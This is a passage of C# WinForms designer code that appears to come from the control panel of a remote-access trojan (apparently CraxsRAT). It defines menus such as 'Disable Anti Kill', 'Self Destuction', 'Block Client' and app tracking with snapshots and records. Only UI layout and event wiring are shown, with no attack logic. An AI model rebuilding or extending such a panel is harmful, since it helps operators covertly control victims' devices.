            this.ToolStripMenuItem13.Name = "ToolStripMenuItem13";
            this.ToolStripMenuItem13.Size = new System.Drawing.Size(189, 28);
            this.ToolStripMenuItem13.Text = "Connection";
            // 
            // ToolStripMenuItem16
            // 
            this.ToolStripMenuItem16.BackColor = System.Drawing.Color.Black;
            this.ToolStripMenuItem16.ForeColor = System.Drawing.Color.White;
            this.ToolStripMenuItem16.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ToolStripMenuItem16.Name = "ToolStripMenuItem16";
            this.ToolStripMenuItem16.Size = new System.Drawing.Size(254, 28);
            this.ToolStripMenuItem16.Text = "Restart Connection";
            this.ToolStripMenuItem16.Click += new System.EventHandler(this.ToolStripMenuItem16_Click);
            // 
            // ToolStripMenuItem17
            // 
            this.ToolStripMenuItem17.BackColor = System.Drawing.Color.Black;
            this.ToolStripMenuItem17.ForeColor = System.Drawing.Color.White;
            this.ToolStripMenuItem17.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ToolStripMenuItem17.Name = "ToolStripMenuItem17";
            this.ToolStripMenuItem17.Size = new System.Drawing.Size(254, 28);
            this.ToolStripMenuItem17.Text = "Block Client";
            this.ToolStripMenuItem17.Click += new System.EventHandler(this.ToolStripMenuItem17_Click);
            // 
            // ToolStripMenuItem18
            // 
            this.ToolStripMenuItem18.BackColor = System.Drawing.Color.Black;
            this.ToolStripMenuItem18.ForeColor = System.Drawing.Color.White;
            this.ToolStripMenuItem18.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ToolStripMenuItem18.Name = "ToolStripMenuItem18";
            this.ToolStripMenuItem18.Size = new System.Drawing.Size(254, 28);
            this.ToolStripMenuItem18.Text = "Disable Anti Kill";
            this.ToolStripMenuItem18.Click += new System.EventHandler(this.ToolStripMenuItem18_Click);
            // 
            // ToolStripMenuItem11
            // 
            this.ToolStripMenuItem11.BackColor = System.Drawing.Color.Black;
            this.ToolStripMenuItem11.ForeColor = System.Drawing.Color.White;
            this.ToolStripMenuItem11.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ToolStripMenuItem11.Name = "ToolStripMenuItem11";
            this.ToolStripMenuItem11.Size = new System.Drawing.Size(254, 28);
            this.ToolStripMenuItem11.Text = "Self Destuction";
            this.ToolStripMenuItem11.Click += new System.EventHandler(this.ToolStripMenuItem11_Click);
            // 
            // ToolStripSeparator8
            // 
            this.ToolStripSeparator8.BackColor = System.Drawing.Color.Black;
            this.ToolStripSeparator8.ForeColor = System.Drawing.Color.Black;
            this.ToolStripSeparator8.Name = "ToolStripSeparator8";
            this.ToolStripSeparator8.Size = new System.Drawing.Size(186, 6);
            // 
            // KeyboardToolStripMenuItem
            // 
            this.KeyboardToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.KeyboardToolStripMenuItem.Name = "KeyboardToolStripMenuItem";
            this.KeyboardToolStripMenuItem.Size = new System.Drawing.Size(189, 28);
            this.KeyboardToolStripMenuItem.Text = "Keyboard (beta)";
            // 
            // ToolStripSeparator4
            // 
            this.ToolStripSeparator4.BackColor = System.Drawing.Color.Black;
            this.ToolStripSeparator4.ForeColor = System.Drawing.Color.Black;
            this.ToolStripSeparator4.Name = "ToolStripSeparator4";
            this.ToolStripSeparator4.Size = new System.Drawing.Size(186, 6);
            // 
            // ClientFolderToolStripMenuItem
            // 
            this.ClientFolderToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.ClientFolderToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.ClientFolderToolStripMenuItem.Name = "ClientFolderToolStripMenuItem";
            this.ClientFolderToolStripMenuItem.Size = new System.Drawing.Size(189, 28);
            this.ClientFolderToolStripMenuItem.Text = "Client Folder";
            this.ClientFolderToolStripMenuItem.Click += new System.EventHandler(this.ClientFolderToolStripMenuItem_Click);
            // 
            // UsdtToolStripMenuItem
            // 
            this.UsdtToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.UsdtToolStripMenuItem.Name = "UsdtToolStripMenuItem";
            this.UsdtToolStripMenuItem.Size = new System.Drawing.Size(189, 28);
            this.UsdtToolStripMenuItem.Text = "Craxs usdt";
            this.UsdtToolStripMenuItem.Click += new System.EventHandler(this.UsdtToolStripMenuItem_Click);
            // 
            // ctxconnection
            // 
            this.ctxconnection.BackColor = System.Drawing.Color.Black;
            this.ctxconnection.Font = new System.Drawing.Font("Calibri", 12F);
            this.ctxconnection.ImageScalingSize = new System.Drawing.Size(20, 20);
            this.ctxconnection.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.BlockClientToolStripMenuItem});
            this.ctxconnection.Name = "ctxconnection";
            this.ctxconnection.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
            this.ctxconnection.Size = new System.Drawing.Size(149, 32);
            // 
            // BlockClientToolStripMenuItem
            // 
            this.BlockClientToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.BlockClientToolStripMenuItem.Name = "BlockClientToolStripMenuItem";
            this.BlockClientToolStripMenuItem.Size = new System.Drawing.Size(148, 28);
            this.BlockClientToolStripMenuItem.Text = "Unblock";
            this.BlockClientToolStripMenuItem.Click += new System.EventHandler(this.BlockClientToolStripMenuItem_Click);
            // 
            // FWctx
            // 
            this.FWctx.BackColor = System.Drawing.Color.Black;
            this.FWctx.Font = new System.Drawing.Font("Calibri", 12F);
            this.FWctx.ImageScalingSize = new System.Drawing.Size(20, 20);
            this.FWctx.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.AllowAppToolStripMenuItem,
            this.ToolStripMenuItem15,
            this.ToolStripMenuItem25});
            this.FWctx.Name = "ctxconnection";
            this.FWctx.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
            this.FWctx.Size = new System.Drawing.Size(200, 88);
            // 
            // AllowAppToolStripMenuItem
            // 
            this.AllowAppToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.AllowAppToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.AllowAppToolStripMenuItem.Name = "AllowAppToolStripMenuItem";
            this.AllowAppToolStripMenuItem.Size = new System.Drawing.Size(199, 28);
            this.AllowAppToolStripMenuItem.Text = "Allow App";
            this.AllowAppToolStripMenuItem.Click += new System.EventHandler(this.AllowAppToolStripMenuItem_Click);
            // 
            // ToolStripMenuItem15
            // 
            this.ToolStripMenuItem15.ForeColor = System.Drawing.Color.White;
            this.ToolStripMenuItem15.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ToolStripMenuItem15.Name = "ToolStripMenuItem15";
            this.ToolStripMenuItem15.Size = new System.Drawing.Size(199, 28);
            this.ToolStripMenuItem15.Text = "Block App";
            this.ToolStripMenuItem15.Click += new System.EventHandler(this.ToolStripMenuItem15_Click_1);
            // 
            // ToolStripMenuItem25
            // 
            this.ToolStripMenuItem25.ForeColor = System.Drawing.Color.White;
            this.ToolStripMenuItem25.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ToolStripMenuItem25.Name = "ToolStripMenuItem25";
            this.ToolStripMenuItem25.Size = new System.Drawing.Size(199, 28);
            this.ToolStripMenuItem25.Text = "Add to tracker";
            this.ToolStripMenuItem25.Click += new System.EventHandler(this.ToolStripMenuItem25_Click);
            // 
            // TRKctx
            // 
            this.TRKctx.BackColor = System.Drawing.Color.Black;
            this.TRKctx.Font = new System.Drawing.Font("Calibri", 12F);
            this.TRKctx.ImageScalingSize = new System.Drawing.Size(20, 20);
            this.TRKctx.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.ToolStripMenuItem24,
            this.ToolStripMenuItem19,
            this.ToolStripMenuItem21,
            this.ToolStripMenuItem22,
            this.ToolStripMenuItem23,
            this.ToolStripMenuItem20});
            this.TRKctx.Name = "ctxconnection";
            this.TRKctx.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
            this.TRKctx.Size = new System.Drawing.Size(215, 172);
            // 
            // ToolStripMenuItem24
            // 
            this.ToolStripMenuItem24.ForeColor = System.Drawing.Color.White;
            this.ToolStripMenuItem24.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ToolStripMenuItem24.Name = "ToolStripMenuItem24";
            this.ToolStripMenuItem24.Size = new System.Drawing.Size(214, 28);
            this.ToolStripMenuItem24.Text = "Add App";
            this.ToolStripMenuItem24.Click += new System.EventHandler(this.ToolStripMenuItem24_Click);
            // 
            // ToolStripMenuItem19
            // 
            this.ToolStripMenuItem19.ForeColor = System.Drawing.Color.White;
            this.ToolStripMenuItem19.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ToolStripMenuItem19.Name = "ToolStripMenuItem19";
            this.ToolStripMenuItem19.Size = new System.Drawing.Size(214, 28);
            this.ToolStripMenuItem19.Text = "Snapshots";
            this.ToolStripMenuItem19.Click += new System.EventHandler(this.ToolStripMenuItem19_Click);
            // 
            // ToolStripMenuItem21
            // 
            this.ToolStripMenuItem21.ForeColor = System.Drawing.Color.White;
            this.ToolStripMenuItem21.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ToolStripMenuItem21.Name = "ToolStripMenuItem21";
            this.ToolStripMenuItem21.Size = new System.Drawing.Size(214, 28);
            this.ToolStripMenuItem21.Text = "Records";
            this.ToolStripMenuItem21.Click += new System.EventHandler(this.ToolStripMenuItem21_Click);
            // 
            // ToolStripMenuItem22
            // 
            this.ToolStripMenuItem22.ForeColor = System.Drawing.Color.White;
            this.ToolStripMenuItem22.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ToolStripMenuItem22.Name = "ToolStripMenuItem22";
            this.ToolStripMenuItem22.Size = new System.Drawing.Size(214, 28);
            this.ToolStripMenuItem22.Text = "Clear Snapshots";
            this.ToolStripMenuItem22.Click += new System.EventHandler(this.ToolStripMenuItem22_Click);
            // 
            // ToolStripMenuItem23
            // 
            this.ToolStripMenuItem23.ForeColor = System.Drawing.Color.White;
            this.ToolStripMenuItem23.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ToolStripMenuItem23.Name = "ToolStripMenuItem23";
            this.ToolStripMenuItem23.Size = new System.Drawing.Size(214, 28);
            this.ToolStripMenuItem23.Text = "Clear Records";
            this.ToolStripMenuItem23.Click += new System.EventHandler(this.ToolStripMenuItem23_Click);
            // 
            // ToolStripMenuItem20
            // 
            this.ToolStripMenuItem20.ForeColor = System.Drawing.Color.White;
            this.ToolStripMenuItem20.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ToolStripMenuItem20.Name = "ToolStripMenuItem20";
            this.ToolStripMenuItem20.Size = new System.Drawing.Size(214, 28);
            this.ToolStripMenuItem20.Text = "Stop tracking";
            this.ToolStripMenuItem20.Click += new System.EventHandler(this.ToolStripMenuItem20_Click);
            // 
            // blockctx
            // 
            this.blockctx.BackColor = System.Drawing.Color.Black;
            this.blockctx.Font = new System.Drawing.Font("Calibri", 12F);
            this.blockctx.ImageScalingSize = new System.Drawing.Size(20, 20);
            this.blockctx.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.ToolStripMenuItem1});
            this.blockctx.Name = "ctxconnection";
            this.blockctx.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
            this.blockctx.Size = new System.Drawing.Size(179, 32);
            // 
            // ToolStripMenuItem1
            // 
            this.ToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
            this.ToolStripMenuItem1.Name = "ToolStripMenuItem1";
            this.ToolStripMenuItem1.Size = new System.Drawing.Size(178, 28);
            this.ToolStripMenuItem1.Text = "Block Client";
            this.ToolStripMenuItem1.Click += new System.EventHandler(this.ToolStripMenuItem1_Click);
            // 
            // ToolTip1
            // 
            this.ToolTip1.AutomaticDelay = 100;
            this.ToolTip1.BackColor = System.Drawing.Color.Black;
            this.ToolTip1.ForeColor = System.Drawing.Color.White;
            // 
            // notifiform
            // 
            this.notifiform.AutomaticDelay = 0;
            this.notifiform.AutoPopDelay = 5000;
            this.notifiform.BackColor = System.Drawing.Color.Black;
            this.notifiform.Font = new System.Drawing.Font("Calibri", 8F, System.Drawing.FontStyle.Bold);
            this.notifiform.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.notifiform.InitialDelay = 100;
            this.notifiform.OwnerDraw = true;
            this.notifiform.ReshowDelay = 50;
            this.notifiform.TitleFont = new System.Drawing.Font("Calibri", 9F, System.Drawing.FontStyle.Bold);
            this.notifiform.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
            // 
            // clearbtn
            // 
            this.clearbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.clearbtn.FillColor = System.Drawing.Color.Transparent;
            this.clearbtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.clearbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.clearbtn.Location = new System.Drawing.Point(2365, 0);
            this.clearbtn.Margin = new System.Windows.Forms.Padding(4);
            this.clearbtn.Name = "clearbtn";
            this.clearbtn.Padding = new System.Windows.Forms.Padding(4);
            this.clearbtn.Size = new System.Drawing.Size(35, 47);
            this.clearbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.clearbtn.StyleCustomMode = true;
            this.clearbtn.Symbol = 57469;
            this.clearbtn.SymbolSize = 30;
            this.clearbtn.TabIndex = 11;
            this.clearbtn.Text = "DrakeUIAvatar3";
            this.notifiform.SetToolTip(this.clearbtn, "Clear Logs");
            this.clearbtn.Click += new System.EventHandler(this.DrakeUIAvatar3_Click);
            // 
            // DrakeUIButtonIcon7
            // 
            this.DrakeUIButtonIcon7.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIButtonIcon7.FillColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon7.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.DrakeUIButtonIcon7.Font = new System.Drawing.Font("Calibri", 9F);
            this.DrakeUIButtonIcon7.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon7.Location = new System.Drawing.Point(675, 0);
            this.DrakeUIButtonIcon7.Margin = new System.Windows.Forms.Padding(4);
            this.DrakeUIButtonIcon7.Name = "DrakeUIButtonIcon7";
            this.DrakeUIButtonIcon7.RectColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon7.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIButtonIcon7.RectHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon7.RectPressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon7.RectSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon7.Size = new System.Drawing.Size(87, 48);
            this.DrakeUIButtonIcon7.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIButtonIcon7.StyleCustomMode = true;
            this.DrakeUIButtonIcon7.Symbol = 61453;
            this.DrakeUIButtonIcon7.SymbolSize = 45;
            this.DrakeUIButtonIcon7.TabIndex = 33;
            this.notifiform.SetToolTip(this.DrakeUIButtonIcon7, "Clear");
            this.DrakeUIButtonIcon7.Click += new System.EventHandler(this.DrakeUIButtonIcon7_Click_2);
            // 
            // DrakeUIButtonIcon10
            // 
            this.DrakeUIButtonIcon10.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIButtonIcon10.FillColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon10.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.DrakeUIButtonIcon10.Font = new System.Drawing.Font("Calibri", 9F);
            this.DrakeUIButtonIcon10.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon10.Location = new System.Drawing.Point(195, 0);
            this.DrakeUIButtonIcon10.Margin = new System.Windows.Forms.Padding(4);
            this.DrakeUIButtonIcon10.Name = "DrakeUIButtonIcon10";
            this.DrakeUIButtonIcon10.RectColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon10.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIButtonIcon10.RectHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon10.RectPressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon10.RectSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon10.Size = new System.Drawing.Size(87, 48);
            this.DrakeUIButtonIcon10.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIButtonIcon10.StyleCustomMode = true;
            this.DrakeUIButtonIcon10.Symbol = 61453;
            this.DrakeUIButtonIcon10.SymbolSize = 45;
            this.DrakeUIButtonIcon10.TabIndex = 34;
            this.notifiform.SetToolTip(this.DrakeUIButtonIcon10, "Clear");
            this.DrakeUIButtonIcon10.Click += new System.EventHandler(this.DrakeUIButtonIcon10_Click_2);
            // 
            // DrakeUIButtonIcon11
            // 
            this.DrakeUIButtonIcon11.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIButtonIcon11.FillColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon11.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.DrakeUIButtonIcon11.Font = new System.Drawing.Font("Calibri", 9F);
            this.DrakeUIButtonIcon11.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon11.Location = new System.Drawing.Point(1155, 0);
            this.DrakeUIButtonIcon11.Margin = new System.Windows.Forms.Padding(4);
            this.DrakeUIButtonIcon11.Name = "DrakeUIButtonIcon11";
            this.DrakeUIButtonIcon11.RectColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon11.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIButtonIcon11.RectHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon11.RectPressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon11.RectSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon11.Size = new System.Drawing.Size(87, 48);
            this.DrakeUIButtonIcon11.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIButtonIcon11.StyleCustomMode = true;
            this.DrakeUIButtonIcon11.Symbol = 61453;
            this.DrakeUIButtonIcon11.SymbolSize = 45;
            this.DrakeUIButtonIcon11.TabIndex = 35;
            this.notifiform.SetToolTip(this.DrakeUIButtonIcon11, "Clear");
            this.DrakeUIButtonIcon11.Click += new System.EventHandler(this.DrakeUIButtonIcon11_Click_1);
            // 
            // DrakeUIButtonIcon9
            // 
            this.DrakeUIButtonIcon9.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIButtonIcon9.FillColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon9.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.DrakeUIButtonIcon9.FillPressColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon9.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(10)))), ((int)(((byte)(10)))));
            this.DrakeUIButtonIcon9.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIButtonIcon9.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon9.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon9.Location = new System.Drawing.Point(55, 0);
            this.DrakeUIButtonIcon9.Margin = new System.Windows.Forms.Padding(4);
            this.DrakeUIButtonIcon9.Name = "DrakeUIButtonIcon9";
            this.DrakeUIButtonIcon9.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon9.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIButtonIcon9.RectHoverColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon9.RectPressColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon9.RectSelectedColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon9.Size = new System.Drawing.Size(57, 33);
            this.DrakeUIButtonIcon9.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIButtonIcon9.StyleCustomMode = true;
            this.DrakeUIButtonIcon9.Symbol = 61539;
            this.DrakeUIButtonIcon9.SymbolSize = 25;
            this.DrakeUIButtonIcon9.TabIndex = 19;
            this.notifiform.SetToolTip(this.DrakeUIButtonIcon9, "Go To Bottom");
            this.DrakeUIButtonIcon9.Click += new System.EventHandler(this.DrakeUIButtonIcon9_Click);
            // 
            // DrakeUIButtonIcon8
            // 
            this.DrakeUIButtonIcon8.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIButtonIcon8.FillColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon8.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.DrakeUIButtonIcon8.FillPressColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon8.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(10)))), ((int)(((byte)(10)))));
            this.DrakeUIButtonIcon8.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIButtonIcon8.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon8.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon8.Location = new System.Drawing.Point(51, 667);
            this.DrakeUIButtonIcon8.Margin = new System.Windows.Forms.Padding(4);
            this.DrakeUIButtonIcon8.Name = "DrakeUIButtonIcon8";
            this.DrakeUIButtonIcon8.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon8.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIButtonIcon8.RectHoverColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon8.RectPressColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon8.RectSelectedColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon8.Size = new System.Drawing.Size(55, 33);
            this.DrakeUIButtonIcon8.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIButtonIcon8.StyleCustomMode = true;
            this.DrakeUIButtonIcon8.Symbol = 61538;
            this.DrakeUIButtonIcon8.SymbolSize = 25;
            this.DrakeUIButtonIcon8.TabIndex = 18;
            this.notifiform.SetToolTip(this.DrakeUIButtonIcon8, "Go to Top");
            this.DrakeUIButtonIcon8.Click += new System.EventHandler(this.DrakeUIButtonIcon8_Click);
            // 
            // DrakeUIAvatar4
            // 
            this.DrakeUIAvatar4.AvatarSize = 25;
            this.DrakeUIAvatar4.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIAvatar4.Dock = System.Windows.Forms.DockStyle.Left;
            this.DrakeUIAvatar4.FillColor = System.Drawing.Color.Black;
            this.DrakeUIAvatar4.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIAvatar4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIAvatar4.Location = new System.Drawing.Point(0, 0);
            this.DrakeUIAvatar4.Margin = new System.Windows.Forms.Padding(4);
            this.DrakeUIAvatar4.Name = "DrakeUIAvatar4";
            this.DrakeUIAvatar4.Size = new System.Drawing.Size(45, 33);
            this.DrakeUIAvatar4.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIAvatar4.StyleCustomMode = true;
            this.DrakeUIAvatar4.Symbol = 61912;
            this.DrakeUIAvatar4.SymbolSize = 25;
            this.DrakeUIAvatar4.TabIndex = 35;
            this.notifiform.SetToolTip(this.DrakeUIAvatar4, "Send Notification");
            // 
            // clientfoldrbtn
            // 
            this.clientfoldrbtn.CircleRectWidth = 30;
            this.clientfoldrbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.clientfoldrbtn.Dock = System.Windows.Forms.DockStyle.Right;
            this.clientfoldrbtn.FillColor = System.Drawing.Color.Black;
            this.clientfoldrbtn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.clientfoldrbtn.Font = new System.Drawing.Font("Calibri", 9.5F);
            this.clientfoldrbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.clientfoldrbtn.Location = new System.Drawing.Point(144, 0);
            this.clientfoldrbtn.Margin = new System.Windows.Forms.Padding(4);
            this.clientfoldrbtn.Name = "clientfoldrbtn";
            this.clientfoldrbtn.RectColor = System.Drawing.Color.Black;
            this.clientfoldrbtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.clientfoldrbtn.RectHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.clientfoldrbtn.RectPressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.clientfoldrbtn.RectSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.clientfoldrbtn.Size = new System.Drawing.Size(35, 33);
            this.clientfoldrbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.clientfoldrbtn.StyleCustomMode = true;
            this.clientfoldrbtn.Symbol = 61563;
            this.clientfoldrbtn.SymbolSize = 30;
            this.clientfoldrbtn.TabIndex = 30;
            this.notifiform.SetToolTip(this.clientfoldrbtn, "Client Folder");
            this.clientfoldrbtn.Visible = false;
            this.clientfoldrbtn.Click += new System.EventHandler(this.Clientfoldrbtn_Click);
            // 
            // uncheckbtn
            // 
            this.uncheckbtn.CircleRectWidth = 30;
            this.uncheckbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.uncheckbtn.Dock = System.Windows.Forms.DockStyle.Right;
            this.uncheckbtn.FillColor = System.Drawing.Color.Black;
            this.uncheckbtn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.uncheckbtn.Font = new System.Drawing.Font("Calibri", 9.5F);
            this.uncheckbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.uncheckbtn.Location = new System.Drawing.Point(109, 0);
            this.uncheckbtn.Margin = new System.Windows.Forms.Padding(4);
            this.uncheckbtn.Name = "uncheckbtn";
            this.uncheckbtn.RectColor = System.Drawing.Color.Black;
            this.uncheckbtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.uncheckbtn.RectHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.uncheckbtn.RectPressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.uncheckbtn.RectSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.uncheckbtn.Size = new System.Drawing.Size(35, 33);
            this.uncheckbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.uncheckbtn.StyleCustomMode = true;
            this.uncheckbtn.Symbol = 61453;
            this.uncheckbtn.SymbolSize = 20;
